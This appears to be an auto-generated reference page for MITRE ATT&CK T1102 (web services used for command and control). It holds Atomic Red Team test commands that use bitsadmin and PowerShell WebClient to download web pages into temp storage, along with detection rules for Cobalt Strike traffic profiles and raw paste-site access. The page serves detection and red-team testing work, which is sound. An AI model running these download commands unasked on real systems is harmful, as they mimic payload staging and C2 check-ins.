
# Web Service

## Description

### MITRE Description

> Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.

These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.

Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).

## Aliases

```

```

## Additional Attributes

* Bypass: ['Binary Analysis', 'Log analysis', 'Firewall']
* Effective Permissions: None
* Network: True
* Permissions: ['User']
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1102

## Potential Commands

```
bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/ %TEMP%\bitsadmindownload.html

Invoke-WebRequest -Uri www.twitter.com
$T1102 = (New-Object System.Net.WebClient).DownloadData("https://www.reddit.com/")
$wc = New-Object System.Net.WebClient
$T1102 = $wc.DownloadString("https://www.aol.com/")

```

## Commands Dataset

```
[{'command': 'bitsadmin.exe /transfer "DonwloadFile" '
             'http://www.stealmylogin.com/ %TEMP%\\bitsadmindownload.html\n',
  'name': None,
  'source': 'atomics/T1102/T1102.yaml'},
 {'command': 'Invoke-WebRequest -Uri www.twitter.com\n'
             '$T1102 = (New-Object '
             'System.Net.WebClient).DownloadData("https://www.reddit.com/")\n'
             '$wc = New-Object System.Net.WebClient\n'
             '$T1102 = $wc.DownloadString("https://www.aol.com/")\n',
  'name': None,
  'source': 'atomics/T1102/T1102.yaml'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Markus Neis',
                  'description': 'Detects Malleable Amazon Profile',
                  'detection': {'condition': 'selection1 or selection2',
                                'selection1': {'c-uri': '/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books',
                                               'c-useragent': 'Mozilla/5.0 '
                                                              '(Windows NT '
                                                              '6.1; WOW64; '
                                                              'Trident/7.0; '
                                                              'rv:11.0) like '
                                                              'Gecko',
                                               'cs-cookie': '*=csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996',
                                               'cs-host': 'www.amazon.com',
                                               'cs-method': 'GET'},
                                'selection2': {'c-uri': '/N4215/adj/amzn.us.sr.aps',
                                               'c-useragent': 'Mozilla/5.0 '
                                                              '(Windows NT '
                                                              '6.1; WOW64; '
                                                              'Trident/7.0; '
                                                              'rv:11.0) like '
                                                              'Gecko',
                                               'cs-host': 'www.amazon.com',
                                               'cs-method': 'POST'}},
                  'falsepositives': ['Unknown'],
                  'id': '953b895e-5cc9-454b-b183-7f3db555452e',
                  'level': 'high',
                  'logsource': {'category': 'proxy'},
                  'references': ['https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile',
                                 'https://www.hybrid-analysis.com/sample/ee5eca8648e45e2fea9dac0d920ef1a1792d8690c41ee7f20343de1927cc88b9?environmentId=100'],
                  'status': 'experimental',
                  'tags': ['attack.t1102'],
                  'title': 'CobaltStrike Malleable Amazon browsing traffic '
                           'profile'}},
 {'data_source': {'author': 'Markus Neis',
                  'description': 'Detects Malleable (OCSP) Profile with Typo '
                                 '(OSCP) in URL',
                  'detection': {'condition': 'selection',
                                'selection': {'c-uri': '*/oscp/*',
                                              'cs-host': 'ocsp.verisign.com'}},
                  'falsepositives': ['Unknown'],
                  'id': '37325383-740a-403d-b1a2-b2b4ab7992e7',
                  'level': 'high',
                  'logsource': {'category': 'proxy'},
                  'references': ['https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/ocsp.profile'],
                  'status': 'experimental',
                  'tags': ['attack.t1102'],
                  'title': 'CobaltStrike Malleable (OCSP) Profile'}},
 {'data_source': {'author': 'Markus Neis',
                  'description': 'Detects Malleable OneDrive Profile',
                  'detection': {'condition': 'selection and not filter',
                                'filter': {'c-uri': 'http*://onedrive.live.com/*'},
                                'selection': {'c-uri': '*?manifest=wac',
                                              'cs-host': 'onedrive.live.com',
                                              'cs-method': 'GET'}},
                  'falsepositives': ['Unknown'],
                  'id': 'c9b33401-cc6a-4cf6-83bb-57ddcb2407fc',
                  'level': 'high',
                  'logsource': {'category': 'proxy'},
                  'references': ['https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/onedrive_getonly.profile'],
                  'status': 'experimental',
                  'tags': ['attack.t1102'],
                  'title': 'CobaltStrike Malleable OneDrive browsing traffic '
                           'profile'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2019/12/05',
                  'description': 'Detects direct access to raw pastes in '
                                 'different paste services often used by '
                                 'malware in their second stages to download '
                                 'malicious code in encrypted or encoded form',
                  'detection': {'condition': 'selection',
                                'selection': {'c-uri|contains': ['.paste.ee/r/',
                                                                 '.pastebin.com/raw/',
                                                                 '.hastebin.com/raw/']}},
                  'falsepositives': ['User activity (e.g. developer that '
                                     'shared and copied code snippets and used '
                                     'the raw link instead of just copy & '
                                     'paste)'],
                  'fields': ['ClientIP', 'c-uri', 'c-useragent'],
                  'id': '5468045b-4fcc-4d1a-973c-c9c9578edacb',
                  'level': 'high',
                  'logsource': {'category': 'proxy'},
                  'references': ['https://www.virustotal.com/gui/domain/paste.ee/relations'],
                  'status': 'experimental',
                  'tags': ['attack.t1102', 'attack.defense_evasion'],
                  'title': 'Raw Paste Service Access'}},
 {'data_source': ['Host network interface']},
 {'data_source': ['Netflow/Enclave netflow']},
 {'data_source': ['Network protocol analysis']},
 {'data_source': ['Packet capture']},
 {'data_source': ['SSL/TLS inspection']},
 {'data_source': ['Host network interface']},
 {'data_source': ['Netflow/Enclave netflow']},
 {'data_source': ['Network protocol analysis']},
 {'data_source': ['Packet capture']},
 {'data_source': ['SSL/TLS inspection']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Web Service': {'atomic_tests': [{'auto_generated_guid': 'e8dd0f73-4a37-41ee-a4f8-fe06dc247340',
                                                           'description': 'Download '
                                                                          'data '
                                                                          'from '
                                                                          'a '
                                                                          'public '
                                                                          'website '
                                                                          'using '
                                                                          'command '
                                                                          'line\n',
                                                           'executor': {'cleanup_command': 'del '
                                                                                           '%TEMP%\\bitsadmindownload.html '
                                                                                           '>nul '
                                                                                           '2>&1\n',
                                                                        'command': 'bitsadmin.exe '
                                                                                   '/transfer '
                                                                                   '"DonwloadFile" '
                                                                                   'http://www.stealmylogin.com/ '
                                                                                   '%TEMP%\\bitsadmindownload.html\n',
                                                                        'elevation_required': False,
                                                                        'name': 'command_prompt'},
                                                           'name': 'Reach out '
                                                                   'to C2 '
                                                                   'Pointer '
                                                                   'URLs via '
                                                                   'command_prompt',
                                                           'supported_platforms': ['windows']},
                                                          {'auto_generated_guid': 'be6f5309-73d7-426e-9b9d-da128305fa50',
                                                           'description': 'Multiple '
                                                                          'download '
                                                                          'methods '
                                                                          'for '
                                                                          'files '
                                                                          'using '
                                                                          'powershell\n',
                                                           'executor': {'cleanup_command': 'Clear-Variable '
                                                                                           'T1102 '
                                                                                           '>$null '
                                                                                           '2>&1',
                                                                        'command': 'Invoke-WebRequest '
                                                                                   '-Uri '
                                                                                   'www.twitter.com\n'
                                                                                   '$T1102 '
                                                                                   '= '
                                                                                   '(New-Object '
                                                                                   'System.Net.WebClient).DownloadData("https://www.reddit.com/")\n'
                                                                                   '$wc '
                                                                                   '= '
                                                                                   'New-Object '
                                                                                   'System.Net.WebClient\n'
                                                                                   '$T1102 '
                                                                                   '= '
                                                                                   '$wc.DownloadString("https://www.aol.com/")\n',
                                                                        'elevation_required': False,
                                                                        'name': 'powershell'},
                                                           'name': 'Reach out '
                                                                   'to C2 '
                                                                   'Pointer '
                                                                   'URLs via '
                                                                   'powershell',
                                                           'supported_platforms': ['windows']}],
                                         'attack_technique': 'T1102',
                                         'display_name': 'Web Service'}}]
```

# Tactics


* [Command and Control](../tactics/Command-and-Control.md)

* [Defense Evasion](../tactics/Defense-Evasion.md)
    

# Mitigations

None

# Actors


* [RTM](../actors/RTM.md)

* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [Turla](../actors/Turla.md)
    
* [Carbanak](../actors/Carbanak.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [FIN7](../actors/FIN7.md)
    
* [APT37](../actors/APT37.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [FIN6](../actors/FIN6.md)
    
* [APT12](../actors/APT12.md)
    
* [APT41](../actors/APT41.md)
    
